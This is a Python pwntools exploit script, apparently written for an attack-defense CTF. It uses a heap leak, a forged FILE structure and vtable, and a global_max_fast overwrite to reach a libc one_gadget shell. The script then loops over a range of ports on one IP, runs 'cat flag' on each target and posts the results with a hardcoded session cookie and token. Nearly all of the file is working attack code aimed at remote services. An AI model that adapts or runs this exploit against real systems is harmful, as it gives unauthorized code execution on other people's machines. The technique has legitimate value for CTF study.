from pwn import *
import requests
context.binary = './pwn'
#context.log_level = 'debug'
#context.timeout = None
elf = context.binary
libc = elf.libc
one_gadget = [0x45216 , 0x4526a , 0xf02a4 , 0xf1147]
def menu(ch):
	p.sendlineafter('4.exit\n', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('Length:\n', str(size))
	p.sendafter('Content:\n',content)
	#print "add a chunk success"

def edit(content):
	menu(3)
	p.sendlineafter('Name:\n',content)
	#print "edit %d chunk success" % idx

def free(idx):
	menu(2)
	p.sendlineafter('Id:\n', str(idx))
	#print "free chunk %d success " % idx

def exploit(p):
	menu(666)
	array = int(p.recvline().strip('\n'), 16)
	pie_base = array - 0x202040
	#print "array ==> " + hex(array)
	#print "pie_base ==> " + hex(pie_base)

	add(0x128, 'aaaa')	#0
	add(0x128, 'bbbb')	#1

	free(0)	
	add(0x128, 'aaaaaaaa')	#0
	p.recvuntil('Content is:\n')
	main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
	libc_base = main_arena - main_arena_offset - 0x58
	libc.address = libc_base
	#print "main_arena ==> " + hex(main_arena)
	#print "libc_base ==> " + hex(libc_base)

	fake_file = 'a' * (0x20 - 0x10)     #padding
	fake_file += p64(0)                 #write_base => offset_0x20
	fake_file += p64(1)                 #write_ptr  => offset_0x28
	fake_file += 'b' * (0xb8 - 0x28)    #padding
	fake_file += p64(0)                 #mode       => offset_0xc0
	fake_file += 'c' * (0xd0 - 0xc0)    #padding
	fake_file += p64(pie_base + 0x2020E0 - 0x18)   #vtable     => offset_0xd8

	add(0x1400, fake_file)			#2
	edit(p64(libc.address + one_gadget[1])*4 + p64(libc_base+global_max_fast_offset))

	free(2)
	menu(4)

def submit_flag(flag):
    url = 'http://47.108.30.122/commit/flag'
    headers = {'Host': '47.108.30.122','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/json; charset=UTF-8','X-Requested-With': 'XMLHttpRequest','Connection': 'close','Referer': 'http://47.108.30.122/admin','Cookie': 'PHPSESSID=du7c7fo0dklk54k75nivmen236'}
    data = '{"flag":"' + flag + '","token":"85614a0acbbdf27e712e9e87f38735cf"}'
    print(data)
    req = requests.post(url,data=data,headers=headers)
    print(req.text)




def play(ip,port):
	#context.log_level='debug'
	global p , main_arena_offset, global_max_fast_offset

	main_arena_offset = 0x3c4b20
	global_max_fast_offset = 0x3c67f8
	p =remote(ip,port)
	exploit(p)
	
	#p.sendline('exec /bin/sh 1>&0')

	p.sendline('cat flag')
	flag=p.recvuntil('}', timeout=0.5)
	print flag
	return flag

def exp():
	for _ in range(9,17):
		if _ <10:
			_ = '0'+ str(_)
		_ = str(_)
		ip = '47.108.30.122'
		port = '4{}80'.format(_)
		try:
			flag=play(ip,port)
			submit_flag(flag)
			# if flag != null:
			#     submit_flag(flag)
		except Exception as e:
			print(e)
			continue

if __name__ == '__main__':
	exp()